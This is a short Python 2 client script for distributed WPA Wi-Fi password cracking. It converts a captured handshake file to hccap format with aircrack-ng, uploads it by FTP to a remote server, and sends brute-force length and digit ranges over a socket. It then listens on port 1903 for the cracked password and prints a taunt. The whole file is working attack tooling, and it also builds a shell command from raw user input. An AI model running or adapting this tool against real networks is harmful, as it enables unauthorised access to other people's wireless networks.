import socket
import ftplib
import os

#Support only Linux OS.

ip_address = raw_input("[*]Enter the IP address: ")
port_number = raw_input("[*]Enter port number: ")
location = raw_input("[*]Enter the location of the cap file: \n Windwos_Example: C:\PATH\TO\FILE \n Linux_Example: /root/PATH/TO/FILE\n>> ")
name = raw_input("[*]Enter the name of the CAP file: ")
username = raw_input("[*]Enter username: ")
password = raw_input("[*]Enter password: ")
a = raw_input("[*]Enter starting digit to generate: ")
b = raw_input("[*]Enter last digit: ")
min_length = raw_input("[*]Enter min length to generate: ")
max_length = raw_input("[*]Enter max length to generate: ")

def hccat(location):
    os.system('aircrack-ng ' + location +'/' + name + " -J " +location +'/wpa')
    return location

def file_send(location,ip_adress,username,password,name):
    session = ftplib.FTP(ip_address, username, password)
    file = open(location + '/wpa.hccap', 'rb')
    session.storbinary('STOR wpa' +".hccap", file)
    file.close()
    session.close()

def init(a,b,min_length,max_length,ip_address,port_number):
    my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    my_socket.connect((ip_address,int(port_number)))
    my_socket.send(a+","+b+","+min_length+","+max_length)
    my_socket.close

def get_result():
    server_socket = socket.socket()
    server_socket.bind(('0.0.0.0', 1903))
    server_socket.listen(1)
    (client_socket, client_address) = server_socket.accept()
    return client_socket.recv(1024)
    server_socket.close

file_send(hccat(location),ip_address,username,password,name)
print "[*]hcccap sent succsessfully"
init(a,b,min_length,max_length,ip_address,port_number)
print "[*]Server running the attack ..."
print (get_result())
print ("gg ez =)")















































































































##s.close()
